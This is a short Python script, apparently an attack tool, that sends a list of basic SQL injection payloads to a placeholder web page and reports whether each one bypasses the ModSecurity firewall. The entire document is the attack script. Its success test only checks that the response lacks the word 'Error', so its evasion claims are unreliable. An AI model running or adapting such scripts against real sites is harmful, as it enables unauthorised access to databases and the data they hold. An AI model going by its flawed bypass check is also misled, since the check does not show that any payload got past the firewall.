# Script Name: ModSecurity_SQLi_Evasion.py

import requests

# Define the target URL with a vulnerable parameter
target_url = "https://example.com/vulnerable_page.php"

# Define a list of payloads for SQL injection
payloads = [
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1' OR '1'='1'/*",
    # Add more payloads here
]

# Set custom headers (modify as needed)
headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": "https://example.com",
}

def test_payload(payload):
    try:
        # Send the GET request with the payload
        response = requests.get(target_url, headers=headers, params={"param": payload}, timeout=5)
        
        # Check if the response indicates successful evasion
        if "Error" not in response.text:
            return True
        
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    
    return False

def main():
    print("Testing payloads for SQL injection evasion in ModSecurity...\n")
    
    for payload in payloads:
        if test_payload(payload):
            print(f"Payload '{payload}' successfully bypassed ModSecurity.")
        else:
            print(f"Payload '{payload}' did not bypass ModSecurity.")
    
    print("\nTesting complete.")

if __name__ == "__main__":
    main()
